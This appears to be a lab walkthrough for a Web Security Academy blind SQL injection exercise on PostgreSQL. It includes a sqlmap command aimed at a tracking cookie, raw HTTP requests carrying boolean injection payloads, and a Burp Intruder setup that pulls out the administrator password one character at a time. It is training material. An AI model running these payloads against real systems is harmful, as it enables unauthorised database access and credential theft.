
PostgreSQL
##### Base request
GET /product?productId=6 HTTP/2
Host: 0a6d005e0495508b81d4cfcf009f00c5.web-security-academy.net
Cookie: TrackingId=Azz0AjGBIQfIehkH; session=vaZ8eWHeYdMX5gz9ea6kRlTyZuqXfqss
Sec-Ch-Ua: "Not;A=Brand";v="24", "Chromium";v="128"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "macOS"
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.6613.120 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0a6d005e0495508b81d4cfcf009f00c5.web-security-academy.net/filter?category=Gifts
Accept-Encoding: gzip, deflate, br
Priority: u=0, i



##### Step1: Identify SQLi vulnerability 
Run sqlmap on possible vectors.
normally in the url and on the cookies.

The cookies can be mapped with:
_sqlmap -u "https://0a6d005e0495508b81d4cfcf009f00c5.web-security-academy.net/" --cookie='TrackingId=Azz0AjGBIQfIehkH; session=vaZ8eWHeYdMX5gz9ea6kRlTyZuqXfqss' -p "TrackingId" --param-filter="COOKIE" --skip="session" --level=2_

In this lab the _TrackingId_ cookie was vulnerable and you can visually see if the cookie is accepted or not with the following div appearing with an untampered cookie, 
```<div>Welcome back!</div>```
and dissapering when tampered with.
##### Step2: Confirm the vulnerability
Try removing char from the TrackingId Cookie, it disappears. Then change it back.

Add then add a statement which keeps the 
```<div>Welcome back!</div>```

See the request below as an example: 

GET /product?productId=6 HTTP/2
Host: 0a6d005e0495508b81d4cfcf009f00c5.web-security-academy.net
Cookie: TrackingId=Azz0AjGBIQfIehkH _' AND 1=1--_; session=vaZ8eWHeYdMX5gz9ea6kRlTyZuqXfqss
Sec-Ch-Ua: "Not;A=Brand";v="24", "Chromium";v="128"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "macOS"
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.6613.120 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0a6d005e0495508b81d4cfcf009f00c5.web-security-academy.net/filter?category=Gifts
Accept-Encoding: gzip, deflate, br
Priority: u=0, i
##### Step3: Build a boolean expression which can be used to extract password
GET /product?productId=6 HTTP/2
Host: 0a6d005e0495508b81d4cfcf009f00c5.web-security-academy.net
Cookie: TrackingId=Azz0AjGBIQfIehkH' AND 1=(SELECT CASE WHEN (1=1) THEN 1 ELSE 0 END)--; session=vaZ8eWHeYdMX5gz9ea6kRlTyZuqXfqss
Sec-Ch-Ua: "Not;A=Brand";v="24", "Chromium";v="128"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "macOS"
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.6613.120 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0a6d005e0495508b81d4cfcf009f00c5.web-security-academy.net/filter?category=Gifts
Accept-Encoding: gzip, deflate, br
Priority: u=0, i

##### Step4: Confirm the existence of administrator user
GET /product?productId=6 HTTP/2
Host: 0a6d005e0495508b81d4cfcf009f00c5.web-security-academy.net
Cookie: TrackingId=Azz0AjGBIQfIehkH _' AND 1=(SELECT CASE WHEN (1=(SELECT 1 FROM users WHERE username ='administrator')) THEN 1 ELSE 0 END)--_; session=vaZ8eWHeYdMX5gz9ea6kRlTyZuqXfqss
Sec-Ch-Ua: "Not;A=Brand";v="24", "Chromium";v="128"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "macOS"
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.6613.120 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0a6d005e0495508b81d4cfcf009f00c5.web-security-academy.net/filter?category=Gifts
Accept-Encoding: gzip, deflate, br
Priority: u=0, i

##### Step5: Build Skelton to exfil administrator password 
I used this to double check if the SQUEEEAL syntax was correct by manually identifying the first 
char in the password. Skip the manual work if you're confident in you SQL capabilities.  This is easily done by adding the ```<div>Welcome back!</div>``` in the response search bar and selecting ```Auto-scroll```


GET /product?productId=6 HTTP/2
Host: 0a6d005e0495508b81d4cfcf009f00c5.web-security-academy.net
Cookie: TrackingId=Azz0AjGBIQfIehkH _' AND 1=(SELECT CASE WHEN ('a'=SUBSTRING((SELECT password FROM users WHERE username ='administrator'),1,1)) THEN 1 ELSE 0 END)--_; session=vaZ8eWHeYdMX5gz9ea6kRlTyZuqXfqss
Sec-Ch-Ua: "Not;A=Brand";v="24", "Chromium";v="128"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "macOS"
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.6613.120 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0a6d005e0495508b81d4cfcf009f00c5.web-security-academy.net/filter?category=Gifts
Accept-Encoding: gzip, deflate, br
Priority: u=0, i

##### Step6: Craft the Intruder Cluster bomb attack

GET /product?productId=6 HTTP/2
Host: 0a6d005e0495508b81d4cfcf009f00c5.web-security-academy.net
Cookie: TrackingId=Azz0AjGBIQfIehkH _' AND 1=(SELECT CASE WHEN ('**§j§**'=SUBSTRING((SELECT password FROM users WHERE username ='administrator'),**§1§**,1)) THEN 1 ELSE 0 END)--_; session=vaZ8eWHeYdMX5gz9ea6kRlTyZuqXfqss
Sec-Ch-Ua: "Not;A=Brand";v="24", "Chromium";v="128"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "macOS"
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.6613.120 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0a6d005e0495508b81d4cfcf009f00c5.web-security-academy.net/filter?category=Gifts
Accept-Encoding: gzip, deflate, br
Priority: u=0, i

Under **Payloads** add the following sets:
- **Payload set 1**: a-z, A-Z, 0-9     (Simple list)
- **Payload set 2**: 0-25                   (Numbers)   

Under **Settings** -> **Grep - Extract**
- **Highlight** ```<div>Welcome back!</div>```
or set the 
- **Start after expression**: ```<p>|</p>\n                            ```
- **End at delimiter**: ```<p>|</p>```

##### Step7: Run the b-word
Ez sit kid.